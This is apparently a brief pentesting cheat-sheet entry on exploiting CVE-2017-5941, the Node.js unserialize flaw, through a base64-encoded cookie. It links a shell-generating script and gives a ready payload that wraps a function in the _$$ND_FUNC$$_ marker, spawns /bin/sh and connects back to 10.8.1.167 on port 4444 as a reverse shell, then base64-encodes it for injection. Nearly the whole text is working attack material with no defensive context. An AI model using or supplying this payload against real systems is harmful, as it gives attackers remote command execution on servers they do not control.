
##### Requirements
Probably a base64 encoded cookie, with custom input.
Node-JS website

###### Exploitatoin
Use CVE-2017-5941:
Download [nodejsshell.py](https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/master/nodejsshell.py)
Usage:
```
./nodejsshell.py IP PORT
```

Wrap the output:
```
_$$ND_FUNC$$_function(){OUTPUT}()
```


Example:
```
echo -n '{"email": "_$$ND_FUNC$$_function() { var net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"/bin/sh\", []);var client = new net.Socket();client.connect(4444, \"10.8.1.167\", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;}()"}' | base64 -w 0
```